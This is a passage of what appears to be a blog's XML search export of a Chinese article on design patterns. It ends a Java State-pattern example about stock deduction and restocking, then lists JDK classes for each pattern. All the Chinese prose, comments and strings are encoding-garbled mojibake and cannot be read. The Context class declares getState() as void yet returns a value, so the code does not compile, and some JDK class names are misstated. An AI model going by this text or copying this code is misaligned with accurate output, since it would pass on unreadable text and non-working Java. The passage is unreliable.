2017-10-19</p><p>åºŸè¯æˆ‘å°±ä¸è¯´äº†ï¼Œæˆ‘ä»¬è¯´ä¸€ä¸ªç®€å•çš„ä¾‹å­ã€‚å•†å“åº“å­˜ä¸­å¿ƒæœ‰ä¸ªæœ€åŸºæœ¬çš„éœ€æ±‚æ˜¯å‡åº“å­˜å’Œè¡¥åº“å­˜ï¼Œæˆ‘ä»¬çœ‹çœ‹æ€ä¹ˆç”¨çŠ¶æ€æ¨¡å¼æ¥å†™ã€‚</p><p>æ ¸å¿ƒåœ¨äºï¼Œæˆ‘ä»¬çš„å…³æ³¨ç‚¹ä¸å†æ˜¯ Context æ˜¯è¯¥è¿›è¡Œå“ªç§æ“ä½œï¼Œè€Œæ˜¯å…³æ³¨åœ¨è¿™ä¸ª Context ä¼šæœ‰å“ªäº›æ“ä½œã€‚</p><p>å®šä¹‰çŠ¶æ€æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">State</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doAction</span><span class="params">(Context context)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰å‡åº“å­˜çš„çŠ¶æ€ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeductState</span> <span class="keyword">implements</span> <span class="title class_">State</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doAction</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å•†å“å–å‡ºï¼Œå‡†å¤‡å‡åº“å­˜&quot;</span>);</span><br><span class="line">        context.setState(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//... æ‰§è¡Œå‡åº“å­˜çš„å…·ä½“æ“ä½œ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Deduct State&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>å®šä¹‰è¡¥åº“å­˜çŠ¶æ€ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RevertState</span> <span class="keyword">implements</span> <span class="title class_">State</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doAction</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ç»™æ­¤å•†å“è¡¥åº“å­˜&quot;</span>);</span><br><span class="line">        context.setState(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//... æ‰§è¡ŒåŠ åº“å­˜çš„å…·ä½“æ“ä½œ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Revert State&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰é¢ç”¨åˆ°äº† context.setState(this)ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æ€ä¹ˆå®šä¹‰ Context ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Context</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> State state;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Context</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setState</span><span class="params">(State state)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.state = state;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getState</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.state;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥çœ‹ä¸‹å®¢æˆ·ç«¯è°ƒç”¨ï¼Œå¤§å®¶å°±ä¸€æ¸…äºŒæ¥šäº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// æˆ‘ä»¬éœ€è¦æ“ä½œçš„æ˜¯ iPhone X</span></span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Context</span>(<span class="string">&quot;iPhone X&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// çœ‹çœ‹æ€ä¹ˆè¿›è¡Œè¡¥åº“å­˜æ“ä½œ</span></span><br><span class="line">  <span class="type">State</span> <span class="variable">revertState</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RevertState</span>();</span><br><span class="line">  revertState.doAction(context);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// åŒæ ·çš„ï¼Œå‡åº“å­˜æ“ä½œä¹Ÿéå¸¸ç®€å•</span></span><br><span class="line">  <span class="type">State</span> <span class="variable">deductState</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DeductState</span>();</span><br><span class="line">  deductState.doAction(context);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// å¦‚æœéœ€è¦æˆ‘ä»¬å¯ä»¥è·å–å½“å‰çš„çŠ¶æ€</span></span><br><span class="line">    <span class="comment">// context.getState().toString();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯»è€…å¯èƒ½ä¼šå‘ç°ï¼Œåœ¨ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¦‚æœæˆ‘ä»¬ä¸å…³å¿ƒå½“å‰ context å¤„äºä»€ä¹ˆçŠ¶æ€ï¼Œé‚£ä¹ˆ Context å°±å¯ä»¥ä¸ç”¨ç»´æŠ¤ state å±æ€§äº†ï¼Œé‚£æ ·ä»£ç ä¼šç®€å•å¾ˆå¤šã€‚</p><p>ä¸è¿‡ï¼Œå•†å“åº“å­˜è¿™ä¸ªä¾‹å­æ¯•ç«Ÿåªæ˜¯ä¸ªä¾‹ï¼Œæˆ‘ä»¬è¿˜æœ‰å¾ˆå¤šå®ä¾‹æ˜¯éœ€è¦çŸ¥é“å½“å‰ context å¤„äºä»€ä¹ˆçŠ¶æ€çš„ã€‚</p><h3><span id="è¡Œä¸ºå‹æ¨¡å¼æ€»ç»“">è¡Œä¸ºå‹æ¨¡å¼æ€»ç»“</span></h3><p>è¡Œä¸ºå‹æ¨¡å¼éƒ¨åˆ†ä»‹ç»äº†ç­–ç•¥æ¨¡å¼ã€è§‚å¯Ÿè€…æ¨¡å¼ã€è´£ä»»é“¾æ¨¡å¼ã€æ¨¡æ¿æ–¹æ³•æ¨¡å¼å’ŒçŠ¶æ€æ¨¡å¼ï¼Œå…¶å®ï¼Œç»å…¸çš„è¡Œä¸ºå‹æ¨¡å¼è¿˜åŒ…æ‹¬å¤‡å¿˜å½•æ¨¡å¼ã€å‘½ä»¤æ¨¡å¼ç­‰ï¼Œä½†æ˜¯å®ƒä»¬çš„ä½¿ç”¨åœºæ™¯æ¯”è¾ƒæœ‰é™ï¼Œè€Œä¸”æœ¬æ–‡ç¯‡å¹…ä¹ŸæŒºå¤§äº†ï¼Œæˆ‘å°±ä¸è¿›è¡Œä»‹ç»äº†ã€‚</p><h2><span id="æ€»ç»“">æ€»ç»“</span></h2><p> å­¦ä¹ è®¾è®¡æ¨¡å¼çš„ç›®çš„æ˜¯ä¸ºäº†è®©æˆ‘ä»¬çš„ä»£ç æ›´åŠ çš„ä¼˜é›…ã€æ˜“ç»´æŠ¤ã€æ˜“æ‰©å±•ã€‚è¿™æ¬¡æ•´ç†è¿™ç¯‡æ–‡ç« ï¼Œè®©æˆ‘é‡æ–°å®¡è§†äº†ä¸€ä¸‹å„ä¸ªè®¾è®¡æ¨¡å¼ï¼Œå¯¹æˆ‘è‡ªå·±è€Œè¨€æ”¶è·è¿˜æ˜¯æŒºå¤§çš„ã€‚æˆ‘æƒ³ï¼Œæ–‡ç« çš„æœ€å¤§æ”¶ç›Šè€…ä¸€èˆ¬éƒ½æ˜¯ä½œè€…æœ¬äººï¼Œä¸ºäº†å†™ä¸€ç¯‡æ–‡ç« ï¼Œéœ€è¦å·©å›ºè‡ªå·±çš„çŸ¥è¯†ï¼Œéœ€è¦å¯»æ‰¾å„ç§èµ„æ–™ï¼Œè€Œä¸”ï¼Œè‡ªå·±å†™è¿‡çš„æ‰æœ€å®¹æ˜“è®°ä½ï¼Œä¹Ÿç®—æ˜¯æˆ‘ç»™è¯»è€…çš„å»ºè®®å§ã€‚</p><h1><span id="jdkä¸­çš„è®¾è®¡æ¨¡å¼">JDKä¸­çš„è®¾è®¡æ¨¡å¼</span></h1><h2><span id="creationalåˆ›å»ºæ¨¡å¼">Creationalï¼ˆåˆ›å»ºæ¨¡å¼ï¼‰</span></h2><h3><span id="abstract-factoryæŠ½è±¡å·¥å‚æ¨¡å¼">Abstract factoryï¼ˆæŠ½è±¡å·¥å‚æ¨¡å¼ï¼‰:</span></h3><p>åˆ›å»ºä¸€ç»„æœ‰å…³è”çš„å¯¹è±¡å®ä¾‹ã€‚è¿™ä¸ªæ¨¡å¼åœ¨JDKä¸­ä¹Ÿæ˜¯ç›¸å½“çš„å¸¸è§ï¼Œè¿˜æœ‰å¾ˆå¤šçš„frameworkä¾‹å¦‚Springã€‚æˆ‘ä»¬å¾ˆå®¹æ˜“æ‰¾åˆ°è¿™æ ·çš„å®ä¾‹ã€‚<br>java.util.Calendar#getInstance()<br>java.util.Arrays#asList()<br>java.util.ResourceBundle#getBundle()<br>java.sql.DriverManager#getConnection()<br>java.sql.Connection#createStatement()<br>java.sql.Statement#executeQuery()<br>java.text.NumberFormat#getInstance()<br>javax.xml.transform.TransformerFactory#newInstance()</p><h3><span id="builderå»ºé€ è€…æ¨¡å¼">Builderï¼ˆå»ºé€ è€…æ¨¡å¼ï¼‰:</span></h3><p>ä¸»è¦ç”¨æ¥ç®€åŒ–ä¸€ä¸ªå¤æ‚çš„å¯¹è±¡çš„åˆ›å»ºã€‚è¿™ä¸ªæ¨¡å¼ä¹Ÿå¯ä»¥ç”¨æ¥å®ç°ä¸€ä¸ª Fluent Interfaceã€‚<br>java.lang.StringBuilder#append()<br>java.lang.StringBuffer#append()<br>java.sql.PreparedStatement<br>javax.swing.GroupLayout.Group#addComponent()</p><h3><span id="factoryå·¥å‚æ¨¡å¼">Factoryï¼ˆå·¥å‚æ¨¡å¼ï¼‰:</span></h3><p>ç®€å•æ¥è¯´ï¼ŒæŒ‰ç…§éœ€æ±‚è¿”å›ä¸€ä¸ªç±»å‹çš„å®ä¾‹ã€‚<br>java.lang.Proxy#newProxyInstance()<br>java.lang.Object#toString()<br>java.lang.Class#newInstance()<br>java.lang.reflect.Array#newInstance()<br>java.lang.reflect.Constructor#newInstance()<br>java.lang.Boolean#valueOf(String)<br>java.lang.Class#forName()</p><h3><span id="prototypeåŸå‹æ¨¡å¼">Prototypeï¼ˆåŸå‹æ¨¡å¼ï¼‰:</span></h3><p>ä½¿ç”¨è‡ªå·±çš„å®ä¾‹åˆ›å»ºå¦ä¸€ä¸ªå®ä¾‹ã€‚æœ‰æ—¶å€™ï¼Œåˆ›å»ºä¸€ä¸ªå®ä¾‹ç„¶åå†æŠŠå·²æœ‰å®ä¾‹çš„å€¼æ‹·è´è¿‡å»ï¼Œæ˜¯ä¸€ä¸ªå¾ˆå¤æ‚çš„åŠ¨ä½œã€‚æ‰€ä»¥ï¼Œä½¿ç”¨è¿™ä¸ªæ¨¡å¼å¯ä»¥é¿å…è¿™æ ·çš„å¤æ‚æ€§ã€‚<br>java.lang.Object#clone()<br>java.lang.Cloneable</p><h3><span id="singletonå•ä¾‹æ¨¡å¼">Singletonï¼ˆå•ä¾‹æ¨¡å¼ï¼‰:</span></h3><p>åªå…è®¸ä¸€ä¸ªå®ä¾‹ã€‚åœ¨ Effective Javaä¸­å»ºè®®ä½¿ç”¨Emun.<br>java.lang.Runtime#getRuntime()<br>java.awt.Toolkit#getDefaultToolkit()<br>java.awt.GraphicsEnvironment#getLocalGraphicsEnvironment()<br>java.awt.Desktop#getDesktop()</p><h2><span id="structuralç»“æ„æ¨¡å¼">Structuralï¼ˆç»“æ„æ¨¡å¼ï¼‰</span></h2><h3><span id="adapteré€‚é…å™¨æ¨¡å¼">Adapterï¼ˆé€‚é…å™¨æ¨¡å¼ï¼‰:</span></h3><p>æŠŠä¸€ä¸ªæ¥å£æˆ–æ˜¯ç±»å˜æˆå¦å¤–ä¸€ç§ã€‚<br>java.util.Arrays#asList()<br>javax.swing.JTable(TableModel)<br>java.io.InputStreamReader(InputStream)<br>java.io.OutputStreamWriter(OutputStream)<br>javax.xml.bind.annotation.adapters.XmlAdapter#marshal()<br>javax.xml.bind.annotation.adapters.XmlAdapter#unmarshal()</p><h3><span id="bridgeæ¡¥æ¢æ¨¡å¼">Bridgeï¼ˆæ¡¥æ¢æ¨¡å¼ï¼‰ï¼š</span></h3><p>æŠŠæŠ½è±¡å’Œå®ç°è§£è—•ï¼Œäºæ˜¯æ¥å£å’Œå®ç°å¯åœ¨å®Œå…¨ç‹¬ç«‹å¼€æ¥ã€‚<br>AWT (æä¾›äº†æŠ½è±¡å±‚æ˜ å°„äºå®é™…çš„æ“ä½œç³»ç»Ÿ)<br>JDBC</p><h3><span id="compositeç»„åˆæ¨¡å¼">Compositeï¼ˆç»„åˆæ¨¡å¼ï¼‰:</span></h3><p>è®©ä½¿ç”¨è€…æŠŠå•ç‹¬çš„å¯¹è±¡å’Œç»„åˆå¯¹è±¡æ··ç”¨ã€‚<br>javax.swing.JComponent#add(Component)<br>java.awt.Container#add(Component)<br>java.util.Map#putAll(Map)<br>java.util.List#addAll(Collection)<br>java.util.Set#addAll(Collection)</p><h3><span id="decoratorè£…é¥°æ¨¡å¼">Decoratorï¼ˆè£…é¥°æ¨¡å¼ï¼‰:</span></h3><p>ä¸ºä¸€ä¸ªå¯¹è±¡åŠ¨æ€çš„åŠ ä¸Šä¸€ç³»åˆ—çš„åŠ¨ä½œï¼Œè€Œä¸éœ€è¦å› ä¸ºè¿™äº›åŠ¨ä½œçš„ä¸åŒè€Œäº§ç”Ÿå¤§é‡çš„ç»§æ‰¿ç±»ã€‚è¿™ä¸ªæ¨¡å¼åœ¨JDKä¸­å‡ ä¹æ— å¤„ä¸åœ¨ï¼Œæ‰€ä»¥ï¼Œä¸‹é¢çš„åˆ—è¡¨åªæ˜¯ä¸€äº›å…¸å‹çš„ã€‚<br>java.io.BufferedInputStream(InputStream)<br>java.io.DataInputStream(InputStream)<br>java.io.BufferedOutputStream(OutputStream)<br>java.util.zip.ZipOutputStream(OutputStream)<br>java.util.Collections#checked<a href>List|Map|Set|SortedSet|SortedMap</a></p><h3><span id="facadeé—¨é¢æ¨¡å¼">Facadeï¼ˆé—¨é¢æ¨¡å¼ï¼‰:</span></h3><p>ç”¨ä¸€ä¸ªç®€å•çš„æ¥å£åŒ…çŠ¶ä¸€ç»„ç»„ä»¶ï¼Œæ¥å£ï¼ŒæŠ½è±¡æˆ–æ˜¯å­ç³»ç»Ÿã€‚<br>java.lang.Class<br>javax.faces.webapp.FacesServlet</p><h3><span id="flyweightäº«å…ƒæ¨¡å¼">Flyweightï¼ˆäº«å…ƒæ¨¡å¼ï¼‰:</span></h3><p>æœ‰æ•ˆç‡åœ°å­˜å‚¨å¤§é‡çš„å°çš„å¯¹è±¡ã€‚<br>java.lang.Integer#valueOf(int)<br>java.lang.Boolean#valueOf(boolean)<br>java.lang.Byte#valueOf(byte)<br>java.lang.Character#valueOf(char)</p><h3><span id="proxyä»£ç†æ¨¡å¼">Proxyï¼ˆä»£ç†æ¨¡å¼ï¼‰:</span></h3><p>ç”¨ä¸€ä¸ªç®€å•çš„å¯¹è±¡æ¥ä»£æ›¿ä¸€ä¸ªå¤æ‚çš„å¯¹è±¡ã€‚<br>java.lang.reflect.Proxy<br>RMI</p><h2><span id="behavioralè¡Œä¸ºæ¨¡å¼">Behavioral(è¡Œä¸ºæ¨¡å¼)</span></h2><h3><span id="chain-of-responsibilityè´£ä»»é“¾æ¨¡å¼">Chain of responsibilityï¼ˆè´£ä»»é“¾æ¨¡å¼ï¼‰:</span></h3><p>æŠŠä¸€ä¸ªå¯¹è±¡åœ¨ä¸€ä¸ªé“¾æ¥ä¼ é€’ç›´åˆ°è¢«å¤„ç†ã€‚åœ¨è¿™ä¸ªé“¾ä¸Šçš„æ‰€æœ‰çš„å¯¹è±¡æœ‰ç›¸åŒçš„æ¥å£ï¼ˆæŠ½è±¡ç±»ï¼‰ä½†å´æœ‰ä¸åŒçš„å®ç°ã€‚<br>java.util.logging.Logger#log()<br>javax.servlet.Filter#doFilter()</p><h3><span id="commandå‘½ä»¤æ¨¡å¼">Commandï¼ˆå‘½ä»¤æ¨¡å¼ï¼‰:</span></h3><p>æŠŠä¸€ä¸ªæˆ–ä¸€äº›å‘½ä»¤å°è£…åˆ°ä¸€ä¸ªå¯¹è±¡ä¸­ã€‚<br>java.lang.Runnable<br>javax.swing.Action</p><h3><span id="interpreter">Interpreter:</span></h3><p>ä¸€ä¸ªè¯­æ³•è§£é‡Šå™¨çš„æ¨¡å¼ã€‚<br>java.util.Pattern<br>java.text.Normalizer<br>java.text.Format</p><h3><span id="iterator">Iterator:</span></h3><p>æä¾›ä¸€ç§ä¸€è‡´çš„æ–¹æ³•æ¥é¡ºåºéå†ä¸€ä¸ªå®¹å™¨ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚<br>java.util.Iterator<br>java.util.Enumeration</p><h3><span id="mediator">Mediator:</span></h3><p>ç”¨æ¥å‡å°‘å¯¹è±¡å•çš„ç›´æ¥é€šè®¯çš„ä¾èµ–å…³ç³»ã€‚ä½¿ç”¨ä¸€ä¸ªä¸­é—´ç±»æ¥ç®¡ç†æ¶ˆæ¯çš„æ–¹å‘ã€‚<br>java.util.Timer<br>java.util.concurrent.Executor#execute()<br>java.util.concurrent.ExecutorService#submit()<br>java.lang.reflect.Method#invoke()</p><h3><span id="mementoå¤‡å¿˜å½•æ¨¡å¼">Mementoï¼ˆå¤‡å¿˜å½•æ¨¡å¼ï¼‰:</span></h3><p>ç»™ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€åšä¸€ä¸ªå¿«ç…§ã€‚Dateç±»åœ¨å†…éƒ¨ä½¿ç”¨äº†ä¸€ä¸ªlongå‹æ¥åšè¿™ä¸ªå¿«ç…§ã€‚<br>java.util.Date<br>java.io.Serializable</p><h3><span id="null-object">Null Object:</span></h3><p>è¿™ä¸ªæ¨¡å¼ç”¨æ¥è§£å†³å¦‚æœä¸€ä¸ªCollectionä¸­æ²¡æœ‰å…ƒç´ çš„æƒ…å†µã€‚<br>java.util.Collections#emptyList()<br>java.util.Collections#emptyMap()<br>java.util.Collections#emptySet()</p><h3><span id="observerè§‚å¯Ÿè€…æ¨¡å¼">Observerï¼ˆè§‚å¯Ÿè€…æ¨¡å¼ï¼‰:</span></h3><p>å…è®¸ä¸€ä¸ªå¯¹è±¡å‘æ‰€æœ‰çš„ä¾¦å¬çš„å¯¹è±¡å¹¿æ’­è‡ªå·±çš„æ¶ˆæ¯æˆ–äº‹ä»¶ã€‚<br>java.util.EventListener<br>javax.servlet.http.HttpSessionBindingListener<br>javax.servlet.http.HttpSessionAttributeListener<br>javax.faces.event.PhaseListener</p><h3><span id="stateçŠ¶æ€æ¨¡å¼">Stateï¼ˆçŠ¶æ€æ¨¡å¼ï¼‰:</span></h3><p>è¿™ä¸ªæ¨¡å¼å…è®¸ä½ å¯ä»¥åœ¨è¿è¡Œæ—¶å¾ˆå®¹æ˜“åœ°æ ¹æ®è‡ªèº«å†…éƒ¨çš„çŠ¶æ€æ”¹å˜å¯¹è±¡çš„è¡Œä¸ºã€‚<br>java.util.Iterator<br>javax.faces.lifecycle.LifeCycle#execute()</p><h3><span id="strategyç­–ç•¥æ¨¡å¼">Strategyï¼ˆç­–ç•¥æ¨¡å¼ï¼‰:</span></h3><p>å®šä¹‰ä¸€ç»„ç®—æ³•ï¼Œå¹¶æŠŠå…¶å°è£…åˆ°ä¸€ä¸ªå¯¹è±¡ä¸­ã€‚ç„¶ååœ¨è¿è¡Œæ—¶ï¼Œå¯ä»¥çµæ´»çš„ä½¿ç”¨å…¶ä¸­çš„ä¸€ä¸ªç®—æ³•ã€‚<br>java.util.Comparator#compare()<br>javax.servlet.http.HttpServlet<br>javax.servlet.Filter#doFilter()</p><h3><span id="template-methodæ¨¡æ¿æ¨¡å¼">Template methodï¼ˆæ¨¡æ¿æ¨¡å¼ï¼‰:</span></h3><p>å…è®¸å­ç±»é‡è½½éƒ¨åˆ†çˆ¶ç±»è€Œä¸éœ€è¦å®Œå…¨é‡å†™ã€‚<br>java.util.Collections#sort()<br>java.io.InputStream#skip()<br>java.io.InputStream#read()<br>java.util.AbstractList#indexOf()</p><h3><span id="visitor">Visitor:</span></h3><p>ä½œç”¨äºæŸä¸ªå¯¹è±¡ç¾¤ä¸­å„ä¸ªå¯¹è±¡çš„æ“ä½œ. å®ƒå¯ä»¥ä½¿ä½ åœ¨ä¸æ”¹å˜è¿™äº›å¯¹è±¡æœ¬èº«çš„æƒ…å†µä¸‹,å®šä¹‰ä½œç”¨äºè¿™äº›å¯¹è±¡çš„æ–°æ“ä½œ.</p><p>javax.lang.model.element.Element å’Œjavax.lang.model.element.ElementVisitor<br>javax.lang.model.type.TypeMirror å’Œjavax.lang.model.type.TypeVisitor</p>]]></content>
      
      
      <categories>
          
          <category> design pattern </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¾è®¡æ¨¡å¼ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
